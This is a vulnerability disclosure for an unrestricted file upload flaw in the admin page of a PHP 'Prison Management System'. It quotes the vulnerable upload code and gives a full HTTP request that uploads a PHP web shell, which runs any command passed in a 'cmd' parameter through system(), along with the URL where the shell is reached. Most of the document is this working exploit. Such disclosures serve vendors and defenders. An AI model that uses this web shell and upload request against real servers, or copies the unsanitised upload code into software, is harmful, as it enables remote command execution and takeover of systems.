Prison Management System - File upload on (/Admin/add-admin.php) 

Vendor Homepage:

```
https://www.sourcecodester.com/sql/17287/prison-management-system.html
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
/Admin/add-admin.php
```

Using `$_FILES["avatar"]["name"]` as the filename on the server can lead to file upload attacks.

```
$image= addslashes(file_get_contents($_FILES['avatar']['tmp_name']));
$image_name= addslashes($_FILES['avatar']['name']);
$image_size= getimagesize($_FILES['avatar']['tmp_name']);
move_uploaded_file($_FILES["avatar"]["tmp_name"],"../uploadImage/Profile/" . $_FILES["avatar"]["name"]);
$location="uploadImage/Profile/" . $_FILES["avatar"]["name"];
```

Proof of vulnerability:

Upload a jpg, capture the packet, modify the file content to malicious code, and modify the file suffix to php

Request:

```
POST /Admin/add-admin.php HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42908713283576230551822620679
Content-Length: 1130
Origin: http://localhost:8888
Sec-GPC: 1
Connection: close
Referer: http://localhost:8888/Admin/add-admin.php
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------42908713283576230551822620679
Content-Disposition: form-data; name="txtusername"

test
-----------------------------42908713283576230551822620679
Content-Disposition: form-data; name="txtfullname"

test
-----------------------------42908713283576230551822620679
Content-Disposition: form-data; name="txtpassword"

admin123
-----------------------------42908713283576230551822620679
Content-Disposition: form-data; name="txtphone"

1123123
-----------------------------42908713283576230551822620679
Content-Disposition: form-data; name="avatar"; filename="1.php"
Content-Type: image/jpeg

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
-----------------------------42908713283576230551822620679
Content-Disposition: form-data; name="btncreate"


-----------------------------42908713283576230551822620679--
```

```
http://localhost:8888/uploadImage/Profile/1.php
```



<img width="903" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/30d6c8ab-2dc1-4939-8ca9-f06961284176">

